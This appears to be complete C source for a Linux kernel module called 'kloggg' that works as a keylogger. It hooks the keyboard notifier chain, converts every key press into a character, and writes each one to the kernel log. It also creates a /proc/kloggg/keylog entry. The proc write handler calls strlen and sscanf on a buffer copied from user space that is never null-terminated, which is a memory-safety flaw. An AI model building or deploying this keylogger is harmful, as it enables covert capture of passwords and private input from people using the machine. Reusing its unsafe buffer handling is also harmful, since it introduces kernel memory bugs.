#include <linux/init.h>
#include <linux/module.h>
#include <linux/notifier.h>
#include <linux/keyboard.h>
#include <linux/proc_fs.h>
#include <linux/uaccess.h>
#include "kloggg-keymap.h" /* produced by output of "loadkeys --mktable" */

MODULE_AUTHOR("Nicholas Hubbard");
MODULE_LICENSE("GPL");

/* proc_fs */
#define BUFSIZE 2048

static struct proc_dir_entry *kloggg_proc_dir;
static struct proc_dir_entry *kloggg_proc_file;

static ssize_t kloggg_proc_file_read(struct file *file, char __user *ubuf, size_t count, loff_t *ppos) {
  char buf[BUFSIZE];
  int len = 0;

  if (*ppos > 0 || count < BUFSIZE)
    return 0;

  len += sprintf(buf, "kloggg here\n");

  if (copy_to_user(ubuf, buf, len))
    return -EFAULT;

  *ppos = len;

  return len;
}

static ssize_t kloggg_proc_file_write(struct file *file, const char __user *ubuf, size_t count, loff_t *ppos) {
	int num, c, i, m;

	char buf[BUFSIZE];

	if(*ppos > 0 || count > BUFSIZE)
		return -EFAULT;

	if(copy_from_user(buf,ubuf,count))
		return -EFAULT;

	num = sscanf(buf,"%d %d",&i,&m);

	if(num != 2)
		return -EFAULT;

	c = strlen(buf);

	*ppos = c;

	return c;
}

static struct proc_ops kloggg_fops = {
  .proc_read = kloggg_proc_file_read,
  .proc_write = kloggg_proc_file_write
};


static u_short kloggg_keycode_to_symbol(unsigned int keycode, int shift_mask) {
  u_short symbol;
  if ((shift_mask & (1 << KG_SHIFT)) && (shift_mask & (1 << KG_CTRL))) {
    symbol = shift_ctrl_map[keycode];
  }
  else if ((shift_mask & (1 << KG_ALT)) && (shift_mask & (1 << KG_CTRL))) {
    symbol = ctrl_alt_map[keycode];
  }
  else if ((shift_mask & (1 << KG_ALTGR)) && (shift_mask & (1 << KG_CTRL))) {
    symbol = altgr_ctrl_map[keycode];
  }
  else if ((shift_mask & (1 << KG_SHIFT)) && (shift_mask & (1 << KG_ALT))) {
    symbol = shift_alt_map[keycode];
  }
  else if (shift_mask & (1 << KG_SHIFT)) {
    symbol = shift_map[keycode];
  }
  else if (shift_mask & (1 << KG_ALTGR)) {
    symbol = altgr_map[keycode];
  }
  else if (shift_mask & (1 << KG_ALT)) {
    symbol = alt_map[keycode];
  }
  else if (shift_mask & (1 << KG_CTRL)) {
    symbol = ctrl_map[keycode];
  }
  else {
    symbol = plain_map[keycode];
  }
  return symbol;
}

static int kloggg_log(struct notifier_block *nb, unsigned long action, void *data) {
  struct keyboard_notifier_param *param = data;

  if (action == KBD_KEYCODE && param->down) {
    unsigned int keycode = param->value;
    int shift_mask = param->shift;
    u_short symbol = kloggg_keycode_to_symbol(keycode, shift_mask);
    printk(KERN_INFO "kloggg: %lc", symbol);
  }

  return NOTIFY_OK;
}

static struct notifier_block kloggg_nb = {
  .notifier_call = kloggg_log
};

/* Module initialization */
static int __init kloggg_init(void) {
  kloggg_proc_dir = proc_mkdir("kloggg", NULL);
  kloggg_proc_file = proc_create("keylog", 0644, kloggg_proc_dir, &kloggg_fops);
  register_keyboard_notifier(&kloggg_nb);
  return 0;
}

/* Module cleanup */
static void __exit kloggg_exit(void) {
  proc_remove(kloggg_proc_file);
  proc_remove(kloggg_proc_dir);
  unregister_keyboard_notifier(&kloggg_nb);
}

module_init(kloggg_init);
module_exit(kloggg_exit);
